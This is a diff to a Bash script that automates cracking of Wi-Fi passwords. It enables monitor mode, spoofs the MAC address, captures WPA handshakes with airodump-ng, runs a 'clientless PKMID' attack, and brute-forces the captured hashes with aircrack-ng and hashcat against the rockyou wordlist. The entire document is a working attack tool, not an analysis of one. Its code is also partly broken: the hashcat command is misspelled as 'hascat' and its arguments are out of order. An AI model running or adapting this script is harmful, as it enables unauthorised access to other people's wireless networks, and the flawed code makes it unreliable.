@@ -76,7 +76,6 @@ function dependencies() {
 
 # Function to proceed with the attack mode
 function startAttack() {
-	if [ "$(echo $mode)" == "handshake" ]; then
 		clear
 		echo -e "${yellowColour}[*]${endColour}${grayColour} Configuring network card in monitor mode...${endColour}\n"
 		airmon-ng start $network_card >/dev/null 2>&1                                        # Starting monitor mode
@@ -86,6 +85,7 @@ function startAttack() {
 
 		echo -e "${yellowColour}[+]${endColour}${grayColour} New mac address: ${endColour}${grayColour}$(macchanger -s ${network_card}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}"
 
+	if [ "$(echo $attack_mode)" == "handshake" ]; then
 		xterm -hold -e "airodump-ng ${network_card}mon" & # Starting aerodump in a new console , because this program works with stderr
 		airodump_xterm_PID=$!                             # Catching the PID of the background process
 
@@ -112,7 +112,7 @@ function startAttack() {
 		# apply brute force to the hash obtained to crack the password with aircrack-ng
 		xterm -hold -e "aircrack-ng -w /usr/share/wordlist/rockyou.txt screenshot-01.cap" &
 
-	elif [ "$(echo $mode)" == "PKMID" ]; then
+	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
 		clear
 		echo -e "${yellowColour}[*]${endColour}${grayColour} Starting ClientLess PKMID attack...${endColour}\n"
 		sleep 2
@@ -124,6 +124,16 @@ function startAttack() {
 		rm screenshot 2>/dev/null
 
 		test -f myHashes
+
+		if [ "$(echo $?)" == "0" ]; then
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Initiating brute force process... ${endColour}\n"
+			sleep 2
+
+			hascat -m 16800 /usr/share/wordlist/rockyou.txt myHashes -d 1 --force
+		else
+			echo -e "\n${redColour}[!]${endColour}${grayColour} Failed to capture the required package... ${endColour}\n"
+			sleep 2
+		fi
 
 	else
 		echo -e "\n${redColour}[*] This attack mode is not valid ${endColour}"
